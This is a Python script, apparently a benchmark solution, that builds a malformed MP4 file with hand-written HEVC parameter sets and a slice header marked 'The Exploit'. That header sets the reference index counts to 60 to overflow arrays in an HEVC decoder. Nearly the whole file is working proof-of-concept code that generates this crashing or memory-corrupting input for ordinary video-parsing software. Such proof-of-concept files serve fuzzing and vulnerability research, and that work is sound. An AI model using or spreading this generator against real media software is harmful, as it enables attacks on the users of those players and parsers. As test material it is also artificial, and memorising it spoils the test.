import struct

class BitWriter:
    def __init__(self):
        self.bits = []

    def u(self, n, val):
        for i in range(n - 1, -1, -1):
            self.bits.append((val >> i) & 1)

    def ue(self, val):
        if val == 0:
            self.bits.append(1)
        else:
            tmp = val + 1
            length = tmp.bit_length()
            for _ in range(length - 1):
                self.bits.append(0)
            self.u(length, tmp)
    
    def se(self, val):
        if val <= 0:
            self.ue(-2 * val)
        else:
            self.ue(2 * val - 1)

    def get_rbsp(self):
        # rbsp_slice_trailing_bits / rbsp_trailing_bits
        self.bits.append(1)
        while len(self.bits) % 8 != 0:
            self.bits.append(0)
        
        b = bytearray()
        for i in range(0, len(self.bits), 8):
            byte = 0
            for j in range(8):
                if i + j < len(self.bits):
                    byte |= (self.bits[i + j] << (7 - j))
            b.append(byte)
        return bytes(b)

def to_nal(rbsp):
    # Emulation prevention
    out = bytearray()
    zeros = 0
    for b in rbsp:
        if zeros >= 2 and b <= 3:
            out.append(3)
            zeros = 0
        out.append(b)
        if b == 0:
            zeros += 1
        else:
            zeros = 0
    return bytes(out)

class Solution:
    def solve(self, src_path: str) -> bytes:
        def p32(x): return struct.pack(">I", x)
        def p16(x): return struct.pack(">H", x)
        def box(t, d): return p32(len(d)+8) + t + d

        # 1. Generate HEVC NAL units
        
        # Helper for ProfileTierLevel
        def write_ptl(w):
            w.u(2, 0); w.u(1, 0); w.u(5, 1) # Main Profile
            w.u(32, 0x60000000)
            w.u(48, 0)
            w.u(8, 30) # Level 1
        
        # VPS
        w = BitWriter()
        w.u(4, 0); w.u(1, 1); w.u(1, 1); w.u(6, 0); w.u(3, 0); w.u(1, 1)
        w.u(16, 0xFFFF)
        write_ptl(w)
        w.u(1, 0); w.ue(0); w.ue(0); w.ue(0)
        w.u(6, 0); w.ue(0); w.u(1, 0); w.u(1, 0)
        vps_nal = b'\x40\x01' + to_nal(w.get_rbsp())

        # SPS
        w = BitWriter()
        w.u(4, 0); w.u(3, 0); w.u(1, 1)
        write_ptl(w)
        w.ue(0); w.ue(1); w.ue(32); w.ue(32) # ID, Chroma, W, H
        w.u(1, 0); w.ue(0); w.ue(0)
        w.ue(0); w.u(1, 0); w.ue(0); w.ue(0); w.ue(0)
        w.ue(0); w.ue(0); w.ue(0); w.ue(0); w.ue(0); w.ue(0)
        w.u(1, 0); w.u(1, 0); w.u(1, 0); w.u(1, 0)
        w.ue(0) # num_short_term_ref_pic_sets
        w.u(1, 0); w.u(1, 1); w.u(1, 0); w.u(1, 0); w.u(1, 0)
        sps_nal = b'\x42\x01' + to_nal(w.get_rbsp())

        # PPS
        w = BitWriter()
        w.ue(0); w.ue(0); w.u(1, 0); w.u(1, 0); w.u(3, 0) # output_flag_present=0
        w.u(1, 0); w.u(1, 0); w.ue(0); w.ue(0); w.se(0)
        w.u(1, 0); w.u(1, 0); w.u(1, 0)
        w.se(0); w.se(0)
        w.u(1, 0); w.u(1, 0); w.u(1, 0); w.u(1, 0); w.u(1, 0); w.u(1, 0); w.u(1, 0); w.u(1, 0)
        w.u(1, 0); w.u(1, 0)
        pps_nal = b'\x44\x01' + to_nal(w.get_rbsp())

        # Slice Header (The Exploit)
        w = BitWriter()
        w.u(1, 1) # first_slice
        w.ue(0) # pps_id
        w.ue(0) # slice_type B (0)
        # pic_output_flag skipped because output_flag_present_flag=0 in PPS
        w.u(4, 0) # poc_lsb
        w.u(1, 0) # short_term_ref_pic_set_sps_flag
        w.ue(0); w.ue(0) # num_neg, num_pos
        w.u(1, 1) # num_ref_idx_active_override_flag
        w.ue(60) # num_ref_idx_l0_active_minus1 (OVERFLOW TRIGGER > 16)
        w.ue(60) # num_ref_idx_l1_active_minus1
        slice_nal = b'\x02\x01' + to_nal(w.get_rbsp())

        sample_data = p32(len(slice_nal)) + slice_nal

        # 2. Build MP4
        ftyp = box(b'ftyp', b'isom\x00\x00\x02\x00isomiso2mp41')

        # hvcC Construction
        hvcc_head = bytearray([
            1, 0x01, 0x60, 0, 0, 0, 0,0,0,0,0,0, 30, 
            0xF0, 0x00, 0xFC, 0xFD, 0xF8, 0xF8, 0, 0, 0x0F, 3
        ])
        hvcc_data = hvcc_head + \
                    b'\x20\x00\x01' + p16(len(vps_nal)) + vps_nal + \
                    b'\x21\x00\x01' + p16(len(sps_nal)) + sps_nal + \
                    b'\x22\x00\x01' + p16(len(pps_nal)) + pps_nal
        
        hvcC = box(b'hvcC', hvcc_data)

        stsd = box(b'stsd', p32(0) + p32(1) + 
                   box(b'hvc1', 
                       b'\x00'*6 + b'\x00\x01' + b'\x00'*16 + 
                       p16(32) + p16(32) + 
                       p32(0x00480000) + p32(0x00480000) + 
                       p32(0) + p16(1) + b'\x00'*32 + 
                       p32(0x0018FFFF) + hvcC))
        
        stts = box(b'stts', p32(0) + p32(1) + p32(1) + p32(100))
        stsc = box(b'stsc', p32(0) + p32(1) + p32(1) + p32(1) + p32(1))
        stsz = box(b'stsz', p32(0) + p32(0) + p32(1) + p32(len(sample_data)))
        
        # Calculate offset
        # ftyp + moov (size TBD) + mdat header(8)
        # We need to construct moov to know its size, but stco needs offset.
        # Use placeholder, measure, then update.
        
        # Placeholder stco
        stco = box(b'stco', p32(0) + p32(1) + p32(0))
        
        stbl = box(b'stbl', stsd + stts + stsc + stsz + stco)
        minf = box(b'minf', box(b'vmhd', p32(0) + p32(1)) + box(b'dinf', box(b'dref', p32(0) + p32(1) + box(b'url ', p32(0)+p32(1)))) + stbl)
        mdia = box(b'mdia', box(b'mdhd', p32(0) + p32(0)*4 + p32(1000) + p32(0)) + box(b'hdlr', p32(0) + p32(0) + b'vide' + b'\x00'*12 + b'VideoHandler\x00') + minf)
        tkhd = box(b'tkhd', p32(0x00000001) + p32(0)*3 + p32(0) + p32(0)*2 + p16(0)*4 + p32(0)*2 + 
                   p32(0x00010000) + p32(0) + p32(0) + 
                   p32(0) + p32(0x00010000) + p32(0) + 
                   p32(0) + p32(0) + p32(0x40000000) + 
                   p32(0) + p32(0))
        trak = box(b'trak', tkhd + mdia)
        mvhd = box(b'mvhd', p32(0) + p32(0)*4 + p32(1000) + p32(100) + p32(0x00010000) + p16(0x0100) + b'\x00'*10 + b'\x00'*24 + p32(2))
        moov = box(b'moov', mvhd + trak)
        
        mdat_offset = len(ftyp) + len(moov) + 8
        
        # Rebuild with correct offset
        stco = box(b'stco', p32(0) + p32(1) + p32(mdat_offset))
        stbl = box(b'stbl', stsd + stts + stsc + stsz + stco)
        minf = box(b'minf', box(b'vmhd', p32(0) + p32(1)) + box(b'dinf', box(b'dref', p32(0) + p32(1) + box(b'url ', p32(0)+p32(1)))) + stbl)
        mdia = box(b'mdia', box(b'mdhd', p32(0) + p32(0)*4 + p32(1000) + p32(0)) + box(b'hdlr', p32(0) + p32(0) + b'vide' + b'\x00'*12 + b'VideoHandler\x00') + minf)
        trak = box(b'trak', tkhd + mdia)
        moov = box(b'moov', mvhd + trak)
        
        mdat = box(b'mdat', sample_data)
        
        return ftyp + moov + mdat